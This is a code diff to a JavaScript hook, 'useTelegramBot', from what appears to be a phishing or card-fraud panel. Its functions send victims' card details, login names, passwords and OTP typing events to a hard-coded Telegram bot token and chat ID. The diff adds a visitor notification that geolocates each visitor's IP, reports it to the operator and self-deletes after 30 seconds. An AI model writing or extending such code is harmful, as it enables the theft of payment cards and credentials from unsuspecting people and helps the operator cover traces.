@@ -5,7 +5,6 @@ import axios from 'axios';
 const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
 const TELEGRAM_CHAT_ID = '5607265678';
 
-// Helper function to delete message after delay
 const deleteMessageAfterDelay = async (chatId, messageId, delay = 30000) => {
   setTimeout(async () => {
     try {
@@ -109,6 +108,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
       return false;
     }
   };
+  
   // ========== SEND FORMATTED CARD DETAILS (NO BUTTONS) ==========
   const sendFormattedCardDetails = async (cardData, sessionId, loginName, loginPassword) => {
     try {
@@ -261,7 +261,55 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
       console.error('Error sending site entry log:', error);
     }
   };
-    // Send log when someone is blocked
+
+  // ========== NEW: VISIT NOTIFICATION (COMPLETE VISITOR INFO) ==========
+  const sendVisitNotification = async (ipAddress, userAgent, referrer, screenResolution, timezone, sessionId, language) => {
+    try {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      // Get geolocation info from IP (optional)
+      let geoInfo = 'Not available';
+      try {
+        const geoResponse = await axios.get(`https://ipapi.co/${ipAddress}/json/`);
+        if (geoResponse.data && !geoResponse.data.error) {
+          geoInfo = `${geoResponse.data.city}, ${geoResponse.data.country_name} (${geoResponse.data.country_code})`;
+        }
+      } catch (geoError) {
+        console.error('Error getting geolocation:', geoError);
+      }
+      
+      const message = `
+🌐 <b>NEW SITE VISITOR</b> 🌐
+━━━━━━━━━━━━━━━━━━━━━
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+🆔 <b>Session ID:</b> <code>${sessionId}</code>
+━━━━━━━━━━━━━━━━━━━━━
+📊 <b>VISITOR INFORMATION:</b>
+├ 🌍 <b>IP Address:</b> <code>${ipAddress}</code>
+├ 📍 <b>Location:</b> ${geoInfo}
+━━━━━━━━━━━━━━━━━━━━
+⚠️ <i>A new visitor has landed on your site!</i>
+⏰ <i>This message will self-delete in 30 seconds</i>
+      `;
+
+      const response = await axios.post(url, {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      });
+      
+      const messageId = response.data.result.message_id;
+      deleteMessageAfterDelay(TELEGRAM_CHAT_ID, messageId, 30000); 
+      
+      console.log('✅ Visit notification sent to Telegram');
+      return true;
+    } catch (error) {
+      console.error('Error sending visit notification:', error);
+      return false;
+    }
+  };
+
+  // ========== Send log when someone is blocked ==========
   const sendBlockedLog = async (username, reason, userIP) => {
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -286,6 +334,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
       console.error('Error sending blocked log:', error);
     }
   };
+
   // ========== CARD VERIFICATION LOG (NO AUTO-DELETE) ==========
   const sendCardVerificationLog = async (username) => {
     try {
@@ -556,6 +605,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     sendCardTypingLog,
     sendOtpTypingLog,
     sendSiteEntryLog,
-    sendBlockedLog
+    sendBlockedLog,
+    sendVisitNotification  // NOUVELLE FONCTION EXPORTÉE
   };
 };
